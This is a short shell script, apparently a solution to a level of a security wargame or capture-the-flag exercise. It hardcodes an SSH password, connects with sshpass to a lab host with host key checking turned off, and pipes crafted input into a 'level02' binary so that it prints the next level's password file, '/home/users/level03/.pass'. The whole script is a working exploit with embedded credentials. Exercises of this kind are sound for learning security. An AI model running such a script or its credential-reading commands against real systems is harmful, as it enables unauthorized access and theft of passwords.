#!/bin/sh

PASS='PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level02@$OVERRIDE -p 4242 << EOF
SHELL=/bin/sh
(python -c "print 'dat_wil\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H\n'";echo 'cat /home/users/level03/.pass') | ./level02
EOF